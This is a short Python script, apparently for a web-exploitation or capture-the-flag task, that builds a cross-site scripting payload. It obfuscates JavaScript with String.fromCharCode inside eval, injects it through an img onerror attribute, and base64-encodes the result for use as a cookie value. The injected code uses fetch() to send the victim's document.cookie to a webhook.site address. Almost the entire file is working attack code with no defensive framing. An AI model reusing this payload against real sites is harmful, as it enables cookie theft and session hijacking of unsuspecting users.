import base64

def get_js(s):
    nums = ",".join(str(ord(c)) for c in s)
    return f"eval(String.fromCharCode({nums}))"

# Example usage:
["%3c><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,44,32,87,111,114,108,100,33,39,41))>","39"]

URL = "https://webhook.site/aa35b748-13d9-4045-88e6-be0041c07805"

code = f"fetch('{URL}?cookies=' + document.cookie)"

payload = get_js(code)

lst = '["%3c><img src=x onerror=' + payload + '>","39"]'

encoded_list = base64.b64encode(lst.encode()).decode()

print("The cookie will be:\n{}".format(encoded_list))
